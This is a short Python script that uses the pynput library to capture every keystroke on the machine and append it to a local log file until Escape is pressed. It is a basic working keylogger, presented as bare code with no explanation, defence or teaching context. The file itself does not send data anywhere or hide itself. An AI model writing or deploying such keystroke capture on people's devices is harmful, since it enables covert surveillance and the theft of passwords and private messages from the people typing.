from pynput.keyboard import Listener ,Key
import logging
log_dir=""
logging.basicConfig(filename=(log_dir+"keylister.txt"),level=logging.DEBUG)
def on_press(key):
    logging.info(str(key))
    if str(key)==str(Key.esc):
       return False

with Listener(on_press=on_press) as listener:
    listener.join()
